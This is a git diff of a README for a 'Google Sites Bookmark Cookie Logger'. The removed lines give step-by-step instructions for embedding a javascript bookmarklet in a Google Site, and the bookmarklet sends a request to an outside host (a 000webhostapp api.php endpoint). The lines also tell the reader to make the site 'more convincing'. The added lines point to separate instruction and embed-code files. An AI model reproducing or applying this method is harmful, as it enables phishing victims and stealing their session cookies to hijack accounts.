@@ -1,22 +1,8 @@
 # Google-Bookmark-Cookie-Logger
 Google Sites Bookmark Cookie Logger Method
 
- 1.Go to sites.google.com and make a new site
+Read The Instructions File
 
- 2.Go to "<'embed'>" and embed code
+and then use the "code for embed" file
 
-3. Paste the code from the txt file
-
- 4.Find and delete PasteJavaHere and paste your own Javascript
-
- (dont have a javascript?, go to https://robloxclothingbeta.000webhostapp.com/index.html click on the site and make one)
-
- 5. Delete the "" and replace with '' like this below
-
- "xJavascript:$.get("//robloxclothingbeta.000webhostapp.com/api.php?id=123456")" 
-
- to 
-
- "xJavascript:$.get('//robloxclothingbeta.000webhostapp.com/api.php?id=123456')"
-
- 6. Hit ok design your site to make it more convincing, upload site and you are done!
+credits to Jade
